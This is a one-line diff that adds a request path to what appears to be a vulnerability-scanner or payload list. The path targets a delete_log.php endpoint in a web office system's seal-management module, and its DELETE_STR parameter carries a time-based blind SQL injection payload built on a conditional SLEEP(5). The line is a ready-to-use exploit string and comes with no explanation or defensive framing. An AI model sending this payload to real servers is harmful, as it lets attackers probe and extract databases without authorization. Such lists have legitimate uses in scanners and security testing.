@@ -1,0 +1,1 @@
+/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and IF(1=1, SLEEP(5), 0) and (1)=(1)
